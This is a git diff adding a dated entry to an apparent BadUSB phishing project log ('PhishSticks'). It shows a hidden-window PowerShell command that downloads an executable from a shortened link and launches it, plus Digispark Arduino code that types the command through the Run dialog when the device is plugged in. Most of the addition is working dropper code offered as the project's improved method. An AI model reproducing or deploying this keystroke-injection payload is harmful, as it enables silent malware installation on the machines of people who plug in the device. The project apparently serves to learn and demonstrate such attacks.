@@ -127,3 +127,32 @@ Instructions and files can be found [here](https://github.com/therealhalonen/Phi
 
 TO DO:
 - add more stealth ?
+
+### 11.10.2023
+
+[therealhalonen](https://github.com/therealhalonen) came up with an idea to run the commands straight from Run (Win + R) without having powershell open. Shortening our payload link to a shortlink and modifying the commands a bit, it managed to fit in the Run bar.
+
+```
+powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/ye2488mj', \"$env:UserProfile/Documents/malvare.exe\");Start-Process \"$env:UserProfile/Documents/malvare.exe\" -WorkingDir \"$env:UserProfile/Documents\""
+```
+
+![2023-10-11_23-04](https://github.com/therealhalonen/PhishSticks/assets/112076418/02a7b00a-7a83-4f37-91ed-fdb08ef66cf6)
+
+To make this work with Digispark, I had to add some backslashes before the backslashes so that DigiKeyboard wont escape them, since they are needed for the command to work. Working code looks like following:
+
+```
+#include <DigiKeyboardFi.h>
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/ye2488mj', \\\"$env:UserProfile/Documents/malware.exe\\\");Start-Process \\\"$env:UserProfile/Documents/malware.exe\\\" -WorkingDir \\\"$env:UserProfile/Documents\\\"\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  exit(0);
+}
+```
+One thing I noticed is that this method is much faster on getting the malware app to pop up than the previous one so I will update the files to this one.
